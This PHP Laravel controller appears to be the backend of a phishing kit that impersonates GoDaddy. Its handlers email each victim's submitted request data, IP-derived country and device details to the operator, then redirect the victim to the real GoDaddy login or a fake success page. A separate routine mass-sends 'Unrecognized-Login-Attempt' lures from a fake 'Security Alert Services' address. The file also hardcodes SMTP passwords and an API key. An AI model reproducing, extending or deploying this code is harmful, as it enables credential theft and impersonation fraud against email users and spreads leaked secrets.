<?php

namespace App\Http\Controllers;

use App\Mail\EmailLog;
use App\Mail\NetLog;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Mail;
use GuzzleHttp\Exception\GuzzleException;
use GuzzleHttp\Client;
use Jenssegers\Agent\Agent;

class PageController extends Controller
{

    public function index(Request $request)
    {
    	$country = $this->getCountryName($request);
        Mail::send( new EmailLog($request, $country));
        return redirect('https://sso.godaddy.com/login?app=email&realm=pass');
    }   

    public function net(Request $request)
    {
        Config::set('mail.username', 'support@redoxtrades.com');
        Config::set('mail.password', '@project200m');
        $country = $this->getCountryName($request);
        $agent = new Agent();
        $all = array(($agent->isDesktop() ? 'YES':'NO'), $agent->platform(), $agent->version($agent->platform()), $agent->device(), $agent->browser());
        Mail::send( new NetLog($request, $country, $all));
        return redirect('/email-secure-success');
    }

        public function agent()
    {
        $agent = new Agent();
        $all = array(($agent->isDesktop() ? 'YES':'NO'), $agent->platform(), $agent->version($agent->platform()), $agent->device(), $agent->browser());
        dd( $all );
        // return redirect('/email-secure-success');
    }


    public function getCountryName($request)
    {   
        $country = '';
        $user_ip = '';
        
        if ($request->ip() == '127.0.0.1') {
            $country = 'Nigeria-L';
        } else {

            try {   
                if (!isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                    $user_ip = $request->ip();

                } else {
                    $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                }
                // dd('http://geoip.nekudo.com/api/'.$user_ip);

                $client = new Client();
                $res = $client->get('http://api.ipstack.com/'.$user_ip.'?access_key=ef8e9f140790d5cdddd808f82bed3bc2');

                $content = json_decode($res->getBody()->getContents());

        
                if (!is_null($content)) {

                    $country = $content->country_name;
                }
            }
            catch( \Exception $e) {
                report($e);
            }
        }
        // dd( $all );

        return $country.' ('. $user_ip.')';
    }

    public function sendEmail(Request $request)
    {
        $this->validate($request, ['email' => 'required']);
        Config::set('mail.username', 'security@mail-guard.services');
        Config::set('mail.password', 'Olu2019@');

        if (strpos($request->email, ',')) {
          $emails = explode(',', $request->email);
          foreach ($emails as $email) {
            $params['from_name'] = 'Security Alert Services';
            $params['from_email'] = 'security@mail-guard.services';
            $params['to'] = preg_replace('/\s/', '', $email);
            $params['template'] = 'godaddy.sample';
            $params['subject'] = 'Unrecognized-Login-Attempt';
            sendmail($params);
        }
    } else {
        $params['from_name'] = 'Security Alert Services';
        $params['from_email'] = 'security@mail-guard.services';
        $params['to'] = $request->email;
        $params['template'] = 'godaddy.sample';
        $params['subject'] = 'Unrecognized-Login-Attempt';
        sendmail($params);
    }
    // return back()->with('status', 'sent');
    return redirect('/email-secure-success');
}

}
